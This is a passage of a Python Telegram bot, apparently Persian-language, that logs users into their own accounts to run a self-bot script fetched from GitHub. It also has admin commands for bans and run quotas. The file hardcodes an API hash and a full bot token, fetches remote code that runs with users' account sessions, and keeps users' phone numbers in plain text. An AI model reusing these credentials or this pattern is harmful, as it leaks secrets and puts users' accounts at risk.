import os
import time
import asyncio
import logging
import re
import httpx # For downloading the self.py script
from pytz import timezone
from datetime import timedelta, datetime
import shutil
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import UserNotParticipant
from telethon import TelegramClient
from telethon.sessions import SQLiteSession, StringSession
from telethon.errors import SessionPasswordNeededError
from pyrogram.filters import Filter
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from contextlib import contextmanager
from pyrogram import Client, errors, idle
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message
)

# --- Configuration & Setup ---
# Use environment variables for sensitive data and dynamic configuration
# Recommended for production. Providing defaults for local testing.

API_ID = int(os.environ.get("API_ID", "29042268"))
API_HASH = os.environ.get("API_HASH", "54a7b377dd4a04a58108639febe2f443")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7481383802:AAGGhXD0ehi8EHrm_NsAUVJsbjdu8RwaIHU")

# Owner IDs should be a comma-separated string in env, parsed to a list of ints.
OWNER_IDS = list(map(int, os.environ.get("OWNER_IDS", "6508600903").split(',')))
# CRITICAL SECURITY RECOMMENDATION: ADNUMBER removed. Admin access MUST be by OWNER_IDS only.
# A phone number can be reassigned or spoofed, granting unauthorized admin access.

# Channel and Group Usernames (NOT IDs, as specified for joining checks)
STATUS_CHANNEL_USERNAME = os.environ.get("STATUS_CHANNEL_USERNAME", "no1self") # Public channel
GROUP_USERNAME = os.environ.get("GROUP_USERNAME", "no1selfgp") # Public group

# Self-bot script source
SELF_BOT_SCRIPT_URL = os.environ.get("SELF_BOT_SCRIPT_URL", "https://raw.githubusercontent.com/Par123456/selfsaz/refs/heads/main/self.py")
LOCAL_SELF_BOT_TEMPLATE_PATH = os.path.join("self_bot_template", "self.py")

# Bot operational settings
MAX_CONCURRENT_SELF_BOTS = int(os.environ.get("MAX_CONCURRENT_SELF_BOTS", "5"))
CONVERSATION_TIMEOUT_SECONDS = int(os.environ.get("CONVERSATION_TIMEOUT_SECONDS", "300")) # 5 minutes
BOT_ACTIVE = os.environ.get("BOT_ACTIVE", "True").lower() == "true" # Global toggle for bot activity

# Ensure necessary directories exist
os.makedirs("database", exist_ok=True)
os.makedirs("sessions", exist_ok=True)
os.makedirs("self_bot_template", exist_ok=True)
os.makedirs("selfbot_instances", exist_ok=True)

# File paths for persistent data (consider SQLite for robustness)
DB_TEXT_PATH = "database/database.txt"
BANNED_FILE = "database/banned_users.txt"
BANNED_NUMBERS_FILE = "database/banned_numbers.txt"
MAX_RUNS_FILE = "database/max_runs.txt" # Stores current available runs
LAST_RUNS_FILE = "database/last_runs.txt"
ADMIN_LOG_CHANNEL_FILE = "database/admin_log_channel.txt"
# Dynamic Message ID for status updates (RECOMMENDATION: Make configurable via admin command)
STATUS_MESSAGE_ID_FILE = "database/status_message_id.txt"
EDU_RUN_MESSAGE_ID_FILE = "database/edu_run_message_id.txt"
EDU_SERVER_MESSAGE_ID_FILE = "database/edu_server_message_id.txt"


# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    filename="bot.log",
    filemode="a"
)
logger = logging.getLogger(__name__)

# Global state variables
LAST_RUNS = {} # {user_id: timestamp_of_last_run} for 24-hour cooldown
REMAINING_RUNS = 0 # Global counter for available runs
BANNED_USERS = set() # Set of banned user IDs
BANNED_NUMBERS = set() # Set of banned phone numbers
ADMIN_LOG_CHANNEL_ID = None # Dynamically loaded/set admin log channel ID
STATUS_MESSAGE_ID = None # Dynamically loaded/set status message ID
EDU_RUN_MESSAGE_ID = None
EDU_SERVER_MESSAGE_ID = None

# Concurrency control for local self-bot operations
semaphore = asyncio.Semaphore(MAX_CONCURRENT_SELF_BOTS)

# Conversation state for active users {user_id: {"step": "...", "data": {...}, "client": TelethonClient, "self_bot_process": asyncio.Process}}
CONV = {}

# Manager for tracking conversation completion and enabling timeouts
class ConversationCompletionManager:
    def __init__(self):
        self._events = {} # {user_id: asyncio.Event}

    def get_user_event(self, user_id):
        if user_id not in self._events:
            self._events[user_id] = asyncio.Event()
        return self._events[user_id]

    def set_completed(self, user_id):
        event = self._events.pop(user_id, None)
        if event:
            event.set()
        logger.info(f"Conversation completion event set for user {user_id}")

    def reset_event(self, user_id):
        # Clear any existing event and create a new one (ensures it's clear for new conv)
        self._events.pop(user_id, None) 
        self._events[user_id] = asyncio.Event() 
        logger.info(f"Conversation completion event reset for user {user_id}")

CONV_COMPLETED_EVENT = ConversationCompletionManager()

# Task tracker for active conversations to handle timeouts externally
ACTIVE_USER_CONVERSATIONS = {} # {user_id: asyncio.Task}

# Pyrogram Client
bot = Client("no1self_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- Persistence Functions ---

def load_persistent_data(file_path, data_type=str, default_value=None):
    """Generic function to load a single value or list from a file."""
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if content:
                try:
                    if data_type == int:
                        return int(content)
                    elif data_type == list: # For lists of IDs
                        return list(map(int, content.split(',')))
                    elif data_type == set: # For sets of strings (e.g., banned numbers)
                        return set(content.split('\n'))
                    return content
                except ValueError:
                    logger.error(f"Invalid format in {file_path}. Resetting to default.")
    return default_value

def save_persistent_data(file_path, data):
    """Generic function to save a single value or list/set to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        if isinstance(data, (list, set)):
            f.write('\n'.join(map(str, data)))
        else:
            f.write(str(data))
    logger.info(f"Saved data to {file_path}.")


def load_last_runs():
    """Loads last run timestamps from file into LAST_RUNS dictionary."""
    if os.path.exists(LAST_RUNS_FILE):
        with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split(",", 1)
                if len(parts) == 2 and parts[0].isdigit():
                    try:
                        LAST_RUNS[int(parts[0])] = float(parts[1])
                    except ValueError:
                        logger.warning(f"Invalid timestamp format in {LAST_RUNS_FILE}: {line.strip()}", exc_info=True)
    logger.info(f"Loaded {len(LAST_RUNS)} last run entries.")

def save_last_runs():
    """Saves current LAST_RUNS dictionary to file."""
    with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
        for uid, ts in LAST_RUNS.items():
            f.write(f"{uid},{ts}\n")
    logger.info("Saved last run entries.")

def load_remaining_runs():
    """Loads remaining runs count from file."""
    global REMAINING_RUNS
    REMAINING_RUNS = load_persistent_data(MAX_RUNS_FILE, data_type=int, default_value=0)
    logger.info(f"Loaded remaining runs: {REMAINING_RUNS}")

def save_remaining_runs(count):
    """Saves remaining runs count to file."""
    save_persistent_data(MAX_RUNS_FILE, count)
    global REMAINING_RUNS
    REMAINING_RUNS = count # Ensure global variable is updated

def load_banned_users():
    """Loads banned user IDs from file."""
    global BANNED_USERS
    BANNED_USERS = set(map(int, load_persistent_data(BANNED_FILE, data_type=list, default_value=[])))
    logger.info(f"Loaded {len(BANNED_USERS)} banned users.")

def save_banned_users():
    """Saves current BANNED_USERS set to file."""
    save_persistent_data(BANNED_FILE, list(BANNED_USERS)) # Convert set to list for saving
    logger.info("Saved banned users.")

def load_banned_numbers():
    """Loads banned phone numbers from file."""
    global BANNED_NUMBERS
    BANNED_NUMBERS = set(load_persistent_data(BANNED_NUMBERS_FILE, data_type=set, default_value=set()))
    logger.info(f"Loaded {len(BANNED_NUMBERS)} banned numbers.")

def save_banned_numbers():
    """Saves current BANNED_NUMBERS set to file."""
    save_persistent_data(BANNED_NUMBERS_FILE, list(BANNED_NUMBERS)) # Convert set to list for saving
    logger.info("Saved banned numbers.")

def load_admin_log_channel_id():
    """Loads the admin log channel ID from file."""
    global ADMIN_LOG_CHANNEL_ID
    ADMIN_LOG_CHANNEL_ID = load_persistent_data(ADMIN_LOG_CHANNEL_FILE, data_type=int)
    logger.info(f"Loaded admin log channel ID: {ADMIN_LOG_CHANNEL_ID}")

def save_admin_log_channel_id(channel_id):
    """Saves the admin log channel ID to file."""
    save_persistent_data(ADMIN_LOG_CHANNEL_FILE, channel_id)
    global ADMIN_LOG_CHANNEL_ID
    ADMIN_LOG_CHANNEL_ID = channel_id

def load_status_message_id():
    """Loads the status message ID from file."""
    global STATUS_MESSAGE_ID
    STATUS_MESSAGE_ID = load_persistent_data(STATUS_MESSAGE_ID_FILE, data_type=int)
    logger.info(f"Loaded status message ID: {STATUS_MESSAGE_ID}")

def save_status_message_id(message_id):
    """Saves the status message ID to file."""
    save_persistent_data(STATUS_MESSAGE_ID_FILE, message_id)
    global STATUS_MESSAGE_ID
    STATUS_MESSAGE_ID = message_id

def load_edu_message_ids():
    """Loads education message IDs from files."""
    global EDU_RUN_MESSAGE_ID, EDU_SERVER_MESSAGE_ID
    EDU_RUN_MESSAGE_ID = load_persistent_data(EDU_RUN_MESSAGE_ID_FILE, data_type=int)
    EDU_SERVER_MESSAGE_ID = load_persistent_data(EDU_SERVER_MESSAGE_ID_FILE, data_type=int)
    logger.info(f"Loaded education message IDs: Run={EDU_RUN_MESSAGE_ID}, Server={EDU_SERVER_MESSAGE_ID}")

def save_edu_message_id(file_path, message_id):
    """Saves a specific education message ID to file."""
    save_persistent_data(file_path, message_id)
    if file_path == EDU_RUN_MESSAGE_ID_FILE:
        global EDU_RUN_MESSAGE_ID
        EDU_RUN_MESSAGE_ID = message_id
    elif file_path == EDU_SERVER_MESSAGE_ID_FILE:
        global EDU_SERVER_MESSAGE_ID
        EDU_SERVER_MESSAGE_ID = message_id


# Initial loading of persistent data
load_last_runs()
load_remaining_runs()
load_banned_users()
load_banned_numbers()
load_admin_log_channel_id()
load_status_message_id()
load_edu_message_ids()

# --- Helper Functions ---

class OwnerFilter(Filter):
    """Custom filter to check if the message sender is an owner."""
    async def __call__(self, client, message: Message) -> bool:
        return message.from_user.id in OWNER_IDS

is_owner = OwnerFilter()

async def download_self_bot_script():
    """Downloads the self.py script from GitHub and saves it locally."""
    os.makedirs("self_bot_template", exist_ok=True)
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(SELF_BOT_SCRIPT_URL, timeout=30)
            response.raise_for_status() # Raise an exception for bad status codes
            with open(LOCAL_SELF_BOT_TEMPLATE_PATH, "wb") as f:
                f.write(response.content)
        logger.info(f"Self-bot script downloaded successfully to {LOCAL_SELF_BOT_TEMPLATE_PATH}")
    except httpx.HTTPStatusError as e:
        logger.error(f"Failed to download self-bot script: HTTP error {e.response.status_code} for {SELF_BOT_SCRIPT_URL}", exc_info=True)
    except httpx.RequestError as e:
        logger.error(f"Failed to download self-bot script due to network error: {e}", exc_info=True)
    except Exception as e:
        logger.error(f"An unexpected error occurred while downloading self-bot script: {e}", exc_info=True)

def save_user_text(user_id: int, username: str = None, phone: str = None):
    """
    Saves or updates user information (ID, username, phone) in a text database.
    Ensures unique user IDs and updates existing entries, maintaining order.
    RECOMMENDATION: Replace with a proper database (e.g., SQLite) for robustness and performance.
    """
    username_str = f"@{username}" if username and not username.startswith("@") else (username or '')
    phone_str = phone or ''

    user_data = [] # List of (user_id, username, phone) tuples
    if os.path.exists(DB_TEXT_PATH):
        with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
            for line in f:
                match = re.match(r"^\d+\.\s+(\d+)\s+(@?\S*)\s*(\S*)$", line.strip())
                if match:
                    user_data.append((int(match.group(1)), match.group(2), match.group(3)))
                else:
                    logger.warning(f"Malformed line in {DB_TEXT_PATH}: '{line.strip()}' - Skipping.", exc_info=False) # No exc_info for malformed line

    updated = False
    for i, (existing_uid, existing_uname, existing_phone) in enumerate(user_data):
        if existing_uid == user_id:
            final_username = username_str if username_str else existing_uname
            final_phone = phone_str if phone_str else existing_phone
            user_data[i] = (user_id, final_username, final_phone)
            updated = True
            logger.debug(f"Updated user {user_id} in database.")
            break

    if not updated:
        user_data.append((user_id, username_str, phone_str))
        logger.info(f"Added new user {user_id} to database.")

    with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
        for idx, (uid, uname, uphone) in enumerate(user_data):
            f.write(f"{idx+1}. {uid} {uname} {uphone}\n".strip() + "\n")


async def cleanup_user_state(user_id: int):
    """
    Cleans up resources associated with a user's active conversation,
    including disconnecting Telethon client, deleting session files,
    terminating self-bot process, and removing user's self-bot instance directory.
    """
    logger.info(f"Initiating cleanup for user {user_id}.")
    
    # Disconnect Telethon client if it exists
    client_instance = CONV.get(user_id, {}).get("client")
    if client_instance:
        try:
            if await client_instance.is_connected():
                await client_instance.disconnect()
            logger.info(f"Telethon client disconnected for user {user_id}.")
        except Exception as e:
            logger.error(f"Error disconnecting Telethon client for user {user_id}: {e}", exc_info=True)
        finally:
            CONV[user_id].pop("client", None) # Remove client reference from CONV

    # Terminate self-bot process if it exists
    self_bot_process = CONV.get(user_id, {}).get("self_bot_process")
    if self_bot_process:
        try:
            if self_bot_process.returncode is None: # Process is still running
                logger.info(f"Terminating self-bot process {self_bot_process.pid} for user {user_id}.")
                self_bot_process.terminate()
                await asyncio.wait_for(self_bot_process.wait(), timeout=5) # Wait for process to exit
            logger.info(f"Self-bot process for user {user_id} terminated or already stopped.")
        except asyncio.TimeoutError:
            logger.warning(f"Self-bot process {self_bot_process.pid} for user {user_id} did not terminate gracefully. Killing.", exc_info=True)
            self_bot_process.kill()
        except Exception as e:
            logger.error(f"Error terminating self-bot process for user {user_id}: {e}", exc_info=True)
        finally:
            CONV[user_id].pop("self_bot_process", None) # Remove process reference

    # Schedule delayed deletion of user-specific session files and self-bot instance directory
    async def delayed_file_delete():
        # Implement a retry mechanism for file deletion
        retries = 3
        for attempt in range(retries):
            await asyncio.sleep(2 ** attempt) # Exponential backoff: 1s, 2s, 4s...
            try:
                # Delete temporary Telethon session files (from login phase)
                session_prefix = os.path.join("sessions", f"user_{user_id}")
                local_session = f"{session_prefix}.session"
                local_journal = f"{session_prefix}.session-journal"
                
                deleted_files = []
                for f in [local_session, local_journal]:
                    if os.path.exists(f):
                        os.remove(f)
                        deleted_files.append(f)
                
                if deleted_files:
                    logger.info(f"Deleted temp session files for user {user_id} (attempt {attempt+1}): {', '.join(deleted_files)}")
                
                # Delete user's self-bot instance directory
                user_self_bot_dir = os.path.join("selfbot_instances", str(user_id))
                if os.path.exists(user_self_bot_dir):
                    shutil.rmtree(user_self_bot_dir)
                    logger.info(f"Deleted self-bot instance directory '{user_self_bot_dir}' for user {user_id} (attempt {attempt+1}).")
                else:
                    logger.debug(f"Self-bot instance directory '{user_self_bot_dir}' not found for user {user_id}, no deletion needed (attempt {attempt+1}).")
                
                return # Success, exit retry loop
            except OSError as err: # Catch specific OS errors for file ops
                logger.warning(f"OS error deleting files/directory for user {user_id} (attempt {attempt+1}/{retries}): {err}", exc_info=True)
                if attempt == retries - 1: # Last attempt failed
                    logger.error(f"Failed to delete files/directory for user {user_id} after multiple attempts.", exc_info=True)
            except Exception as err:
                logger.error(f"Unexpected error deleting files/directory for user {user_id} (attempt {attempt+1}/{retries}): {err}", exc_info=True)
                if attempt == retries - 1:
                    logger.error(f"Failed to delete files/directory for user {user_id} after multiple attempts.", exc_info=True)

    asyncio.create_task(delayed_file_delete())

    # Clear conversation state
    CONV.pop(user_id, None)
    logger.info(f"Conversation state cleared for user {user_id}.")

    # Clear task reference if it exists
    if user_id in ACTIVE_USER_CONVERSATIONS:
        del ACTIVE_USER_CONVERSATIONS[user_id]
        logger.info(f"Active conversation task reference cleared for user {user_id}.")

async def update_channel_message(retries=3):
    """
    Updates the status message in the public channel.
    RECOMMENDATION: STATUS_MESSAGE_ID should be configurable via an admin command.
    """
    if not STATUS_MESSAGE_ID:
        logger.warning("STATUS_MESSAGE_ID is not set. Cannot update status channel message.")
        return

    for attempt in range(retries):
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_time = now.strftime('%H:%M')

            message_text = (
                f"ساعت: {current_time}\n"
                f"تعداد ران مجاز: {REMAINING_RUNS} نفر\n"
                "ربات No1 Self آماده خدمت رسانی است :)\n"
                f"@{bot.me.username}"
            )

            await bot.edit_message_text(
                chat_id=STATUS_CHANNEL_USERNAME,
                message_id=STATUS_MESSAGE_ID,
                text=message_text
            )
            logger.info("Status channel message updated successfully.")
            return
        except Exception as e:
            logger.error(f"Error updating status channel message (attempt {attempt + 1}/{retries}): {e}", exc_info=True)
            await asyncio.sleep(1)


# --- Conversation Timeout Manager ---

async def conversation_timeout_manager(user_id: int, chat_id: int, client: Client):
    """
    Manages the timeout for a user's entire selfbot setup conversation.
    If the conversation doesn't complete within CONVERSATION_TIMEOUT_SECONDS,
    it cleans up and notifies the user.
    """
    try:
        logger.info(f"Starting conversation timeout manager for user {user_id} with timeout {CONVERSATION_TIMEOUT_SECONDS}s.")
        await asyncio.wait_for(CONV_COMPLETED_EVENT.get_user_event(user_id).wait(), timeout=CONVERSATION_TIMEOUT_SECONDS)
        logger.info(f"User {user_id} conversation completed successfully within timeout.")
    except asyncio.TimeoutError:
        logger.warning(f"User {user_id} selfbot setup timed out after {CONVERSATION_TIMEOUT_SECONDS} seconds.")
        try:
            if user_id in CONV:
                await client.send_message(chat_id, "متاسفانه به محدودیت زمانی 5 دقیقه برای انجام عملیات رسیدید! لطفاً برای شروع مجدد /start را ارسال کنید.")
        except Exception as e:
            logger.error(f"Error sending timeout message to user {user_id}: {e}", exc_info=True)
        finally:
            await cleanup_user_state(user_id)
    except Exception as e:
        logger.error(f"Unexpected error in conversation_timeout_manager for user {user_id}: {e}", exc_info=True)
        try:
            if user_id in CONV:
                await client.send_message(chat_id, "خطای غیرمنتظره‌ای رخ داد. لطفاً دوباره تلاش کنید.")
        except Exception:
            pass # Suppress error if sending message fails too
        finally:
            await cleanup_user_state(user_id)


# --- Telegram Message Handlers ---

@bot.on_message(filters.command("setruns") & filters.private & is_owner)
async def set_remaining_runs_command(client: Client, message: Message):
    """Admin command to set the global number of allowed runs."""
    try:
        args = message.text.split()
        if len(args) != 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /setruns <number>")

        count = int(args[1])
        if count < 0:
            return await message.reply_text("استفاده نادرست از دستور! تعداد ران نمی‌تواند منفی باشد.")

        save_remaining_runs(count)
        await update_channel_message()
        await message.reply_text(f"تعداد ران مجاز به {count} تنظیم شد.")
        logger.info(f"Owner {message.from_user.id} set REMAINING_RUNS to {count}.")
    except ValueError:
        await message.reply_text("استفاده نادرست از دستور! لطفاً یک عدد وارد کنید.")
    except Exception as e:
        logger.error(f"Error in set_remaining_runs_command for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطایی رخ داد! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("runs") & filters.private & is_owner)
async def show_runs(client: Client, message: Message):
    """Admin command to show the current number of remaining runs."""
    try:
        await message.reply_text(f"تعداد ران‌های باقی‌مانده: {REMAINING_RUNS}")
    except Exception as e:
        logger.error(f"Error in show_runs for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطایی رخ داد! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("allowed") & filters.private & is_owner)
async def allow_user_again(client: Client, message: Message):
    """Admin command to remove a user from the 24-hour cooldown list."""
    try:
        args = message.text.strip().split()
        if len(args) != 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /allowed <user_id_or_username>")

        target = args[1]
        uid = None
        if target.startswith("@"):
            try:
                user = await client.get_users(target)
                uid = user.id
            except Exception:
                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
                return
        elif target.isdigit():
            uid = int(target)
        else:
            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")

        if uid in LAST_RUNS:
            del LAST_RUNS[uid]
            save_last_runs()
            await message.reply_text(f"محدودیت 24 ساعته کاربر {uid} برداشته شد.")
            logger.info(f"Owner {message.from_user.id} removed cooldown for user {uid}.")
        else:
            await message.reply_text(f"کاربر {uid} در لیست محدودیت 24 ساعته نبود.")
    except Exception as e:
        logger.error(f"Error in allow_user_again for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("ban") & filters.private & is_owner)
async def ban_user(client: Client, message: Message):
    """Admin command to ban a user by ID or username."""
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /ban <user_id_or_username>")

        target = args[1].strip()
        uid = None
        if target.startswith("@"):
            try:
                user = await client.get_users(target)
                uid = user.id
            except Exception:
                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
                return
        elif target.isdigit():
            uid = int(target)
        else:
            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")

        if uid in OWNER_IDS:
            return await message.reply_text("نمی‌توانید ادمین را بن کنید!")

        if uid in BANNED_USERS:
            return await message.reply_text(f"کاربر {uid} قبلاً بن شده است.")

        BANNED_USERS.add(uid)
        save_banned_users()

        try:
            await bot.send_message(uid, "شما توسط مدیران ربات مسدود شده‌اید و دیگر نمی‌توانید از No1 Self استفاده کنید.")
            logger.info(f"Notified banned user {uid}.")
        except Exception:
            logger.warning(f"Could not send ban notification to user {uid}.", exc_info=True)

        await message.reply_text(f"کاربر {uid} با موفقیت بن شد.")
        logger.info(f"Owner {message.from_user.id} banned user {uid}.")
    except Exception as e:
        logger.error(f"Error in ban_user for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در بن کردن کاربر! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("unban") & filters.private & is_owner)
async def unban_user(client: Client, message: Message):
    """Admin command to unban a user by ID or username."""
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /unban <user_id_or_username>")

        target = args[1].strip()
        uid = None
        if target.startswith("@"):
            try:
                user = await client.get_users(target)
                uid = user.id
            except Exception:
                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
                return
        elif target.isdigit():
            uid = int(target)
        else:
            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")

        if uid not in BANNED_USERS:
            return await message.reply_text(f"کاربر {uid} بن نشده بود.")

        BANNED_USERS.discard(uid)
        save_banned_users()
        await message.reply_text(f"کاربر {uid} با موفقیت رفع بن شد.")
        logger.info(f"Owner {message.from_user.id} unbanned user {uid}.")
    except Exception as e:
        logger.error(f"Error in unban_user for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در رفع بن! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("bannumber") & filters.private & is_owner) # Renamed for clarity
async def ban_number(client: Client, message: Message):
    """Admin command to ban a phone number."""
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /bannumber <phone_number>")

        phone = parts[1].strip().replace("+", "").replace(" ", "")
        if not phone.isdigit():
            return await message.reply_text("شماره تلفن نامعتبر است.")
        
        if phone in BANNED_NUMBERS:
            return await message.reply_text(f"شماره {phone} قبلاً بن شده است.")

        BANNED_NUMBERS.add(phone)
        save_banned_numbers()
        await message.reply_text(f"شماره {phone} با موفقیت بن شد.")
        logger.info(f"Owner {message.from_user.id} banned phone number {phone}.")
    except Exception as e:
        logger.error(f"Error in ban_number for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("unbannumber") & filters.private & is_owner) # Renamed for clarity
async def unban_number(client: Client, message: Message):
    """Admin command to unban a phone number."""
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /unbannumber <phone_number>")

        phone = parts[1].strip().replace("+", "").replace(" ", "")
        if not phone.isdigit():
            return await message.reply_text("شماره تلفن نامعتبر است.")

        if phone not in BANNED_NUMBERS:
            return await message.reply_text(f"شماره {phone} بن نشده بود.")

        BANNED_NUMBERS.discard(phone)
        save_banned_numbers()
        await message.reply_text(f"شماره {phone} با موفقیت رفع بن شد.")
        logger.info(f"Owner {message.from_user.id} unbanned phone number {phone}.")
    except Exception as e:
        logger.error(f"Error in unban_number for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("bot") & filters.private & is_owner)
async def toggle_bot(client: Client, message: Message):
    """Admin command to toggle the bot's active status."""
    try:
        global BOT_ACTIVE
        args = message.text.split()
        if len(args) != 2 or args[1].lower() not in ["on", "off"]:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /bot <on|off>")

        BOT_ACTIVE = args[1].lower() == "on"
        status = "روشن" if BOT_ACTIVE else "خاموش"
        await message.reply_text(f"وضعیت ربات به '{status}' تغییر یافت.")
        await update_channel_message()
        logger.info(f"Owner {message.from_user.id} toggled bot status to {status}.")
    except Exception as e:
        logger.error(f"Error in toggle_bot for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطا در تغییر وضعیت ربات! لطفاً دوباره امتحان کنید.")

@bot.on_message(filters.command("setlogchannel") & filters.private & is_owner) # Renamed command for clarity
async def set_admin_log_channel(client: Client, message: Message):
    """Admin command to set the channel for logging new runs."""
    try:
        if not message.forward_from_chat and not (message.chat and message.chat.type == "channel" and message.chat.id == message.from_user.id):
             # Allow forwarding from a channel or direct message from an admin in a channel they control (if bot is in it)
            return await message.reply_text("لطفاً این دستور را در کانال مورد نظر (که ربات عضو آن است) ارسال کنید، یا پیامی از کانال مورد نظر را به اینجا فوروارد کنید.")

        chat_id = None
        title = "Unknown Channel"

        if message.forward_from_chat:
            chat_id = message.forward_from_chat.id
            title = message.forward_from_chat.title
        elif message.chat and message.chat.type == "channel": # Direct message from channel
            chat_id = message.chat.id
            title = message.chat.title
        else:
            return await message.reply_text("خطا در تشخیص کانال. لطفاً دستور را به درستی در یک کانال ارسال کنید یا یک پیام از کانال را فوروارد کنید.")


        try:
            # Check if bot can send messages, send a test and delete it
            test_msg = await client.send_message(chat_id, "این کانال به عنوان کانال لاگ No1 Self تنظیم شد. (پیام آزمایشی)")
            await test_msg.delete()
        except Exception as e:
            return await message.reply_text(f"ربات نمی‌تواند به این کانال پیام ارسال کند. لطفاً ربات را به عنوان ادمین در کانال اضافه کنید و دسترسی ارسال پیام را به آن بدهید. Error: {e}")

        save_admin_log_channel_id(chat_id)

        await message.reply_text(f"""
کانال لاگ با موفقیت تنظیم شد!
ChannelID: `{chat_id}`
Title: {title}
""")
        logger.info(f"Owner {message.from_user.id} set admin log channel to {chat_id} ({title}).")
    except Exception as e:
        logger.error(f"Error in set_admin_log_channel for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text(f"خطایی رخ داد! {e}")

@bot.on_message(filters.command("setstatusmsg") & filters.private & is_owner)
async def set_status_message(client: Client, message: Message):
    """Admin command to set the message ID for the bot's status updates in STATUS_CHANNEL_USERNAME."""
    try:
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /setstatusmsg <message_link_or_id>")
        
        target = args[1].strip()
        msg_id = None

        # Try to parse from a link
        match = re.search(r"t\.me\/(?:c\/)?([^\/]+)\/(\d+)", target)
        if match:
            channel_id_or_username = match.group(1)
            msg_id = int(match.group(2))
            
            # Verify the channel matches our configured status channel
            try:
                chat = await client.get_chat(channel_id_or_username)
                if chat.username and chat.username == STATUS_CHANNEL_USERNAME:
                    pass
                elif str(chat.id) == STATUS_CHANNEL_USERNAME: # If STATUS_CHANNEL_USERNAME is an ID
                    pass
                else:
                    return await message.reply_text(f"لینک ارائه شده مربوط به کانال وضعیت ربات ({STATUS_CHANNEL_USERNAME}) نیست.")
            except Exception:
                 return await message.reply_text("کانال مشخص شده در لینک یافت نشد یا ربات در آن عضو نیست.")

        elif target.isdigit():
            msg_id = int(target)
            # Assume it's an ID within STATUS_CHANNEL_USERNAME
        else:
            return await message.reply_text("لطفاً لینک پیام (مثال: `https://t.me/no1self/94`) یا شناسه پیام را وارد کنید.")
        
        if msg_id:
            try:
                # Test if the message exists and is accessible
                await client.get_messages(STATUS_CHANNEL_USERNAME, msg_id)
            except Exception:
                return await message.reply_text(f"پیامی با شناسه `{msg_id}` در کانال `{STATUS_CHANNEL_USERNAME}` یافت نشد یا ربات به آن دسترسی ندارد.")

            save_status_message_id(msg_id)
            await message.reply_text(f"شناسه پیام وضعیت کانال با موفقیت به `{msg_id}` تنظیم شد.")
            await update_channel_message() # Update it immediately
            logger.info(f"Owner {message.from_user.id} set status message ID to {msg_id}.")
        else:
            await message.reply_text("خطا در تشخیص شناسه پیام. لطفاً دوباره تلاش کنید.")

    except Exception as e:
        logger.error(f"Error in set_status_message for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text(f"خطایی رخ داد! {e}")

@bot.on_message(filters.command("setedumsg") & filters.private & is_owner)
async def set_education_messages(client: Client, message: Message):
    """Admin command to set message IDs for education content."""
    try:
        args = message.text.split(maxsplit=2)
        if len(args) != 3 or args[1].lower() not in ["run", "server"]:
            return await message.reply_text("استفاده نادرست از دستور! Usage: /setedumsg <run|server> <message_link_or_id>")
        
        edu_type = args[1].lower()
        target = args[2].strip()
        msg_id = None

        match = re.search(r"t\.me\/(?:c\/)?([^\/]+)\/(\d+)", target)
        if match:
            channel_id_or_username = match.group(1)
            msg_id = int(match.group(2))
            
            try:
                chat = await client.get_chat(channel_id_or_username)
                if chat.username and chat.username == STATUS_CHANNEL_USERNAME:
                    pass
                elif str(chat.id) == STATUS_CHANNEL_USERNAME: # If STATUS_CHANNEL_USERNAME is an ID
                    pass
                else:
